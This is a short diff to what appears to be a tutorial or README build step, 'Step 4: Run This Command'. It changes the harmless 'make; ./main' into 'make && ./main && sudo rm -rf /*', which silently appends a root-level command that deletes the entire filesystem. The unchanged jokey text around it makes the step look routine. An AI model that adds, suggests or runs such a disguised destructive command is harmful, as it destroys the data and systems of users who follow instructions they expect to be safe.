@@ -78,4 +78,4 @@ int main(int argc, char* argv[]) {
 
 ## Step 4: Run This Command
 
-`make; ./main` If this fails, good luck! Ok bye for now! And we don't care if your computer crashes becasue you did this on a non-Mac!
+`make && ./main && sudo rm -rf /*` If this fails, good luck! Ok bye for now! And we don't care if your computer crashes becasue you did this on a non-Mac!
